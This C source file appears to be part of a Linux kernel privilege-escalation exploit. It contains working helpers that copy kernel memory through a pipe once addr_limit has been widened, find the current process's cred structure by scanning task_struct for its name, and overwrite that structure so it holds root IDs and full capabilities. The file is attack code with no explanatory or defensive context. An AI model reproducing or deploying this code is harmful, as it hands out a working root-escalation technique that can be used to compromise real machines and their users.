#define _GNU_SOURCE
#include "kernel.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Copy len bytes from src to dst through a pipe. Works when addr_limit allows
// kernel addresses: write() reads src into the pipe, read() writes it to dst.
int kernel_memcpy(void *src, void *dst, size_t len)
{
    int pipefd[2];
    if (pipe(pipefd) != 0)
        return -1;

    ssize_t n = write(pipefd[1], src, len);
    if (n != (ssize_t)len) {
        close(pipefd[0]);
        close(pipefd[1]);
        return 1;
    }

    n = read(pipefd[0], dst, len);
    close(pipefd[0]);
    close(pipefd[1]);

    return (n == (ssize_t)len) ? 0 : -1;
}

// Read a pointer stored at a kernel address.
void *read_ptr(void *addr)
{
    void *ptr = NULL;
    if (kernel_memcpy(addr, &ptr, sizeof(ptr)) != 0)
        return NULL;
    return ptr;
}

// Given a kernel task_struct pointer, locate our cred pointer.
// Copies a chunk of task_struct, finds our comm string, and reads the
// pointer just before it. The 0x400 size is a guess; widen it if comm
// falls outside the copied range.
struct cred *find_cred(void *task)
{
    char buf[0x400];

    if (kernel_memcpy(task, buf, sizeof(buf)) != 0)
        return NULL;

    char *comm = memmem(buf, sizeof(buf), OUR_COMM, sizeof(OUR_COMM));
    if (!comm)
        return NULL;

    size_t off = comm - buf;
    if (off < sizeof(void *))
        return NULL;

    // The cred pointer is stored right before comm in the kernel.
    struct cred *cred_ptr;
    memcpy(&cred_ptr, buf + off - sizeof(void *), sizeof(cred_ptr));
    return cred_ptr;
}

// Make the given cred structure root with all capabilities.
// Copies the whole struct out, edits it, and copies it back.
int overwrite_creds(struct cred *kcred)
{
    struct cred root;

    if (kernel_memcpy(kcred, &root, sizeof(root)) != 0)
        return -1;

    root.uid = root.gid = root.suid = root.sgid = 0;
    root.euid = root.egid = root.fsuid = root.fsgid = 0;

    for (int i = 0; i < 2; i++) {
        root.cap_inheritable.cap[i] = 0xffffffffu;
        root.cap_permitted.cap[i]   = 0xffffffffu;
        root.cap_effective.cap[i]   = 0xffffffffu;
        root.cap_bset.cap[i]        = 0xffffffffu;
    }

    if (kernel_memcpy(&root, kcred, sizeof(root)) != 0)
        return -1;

    return 0;
}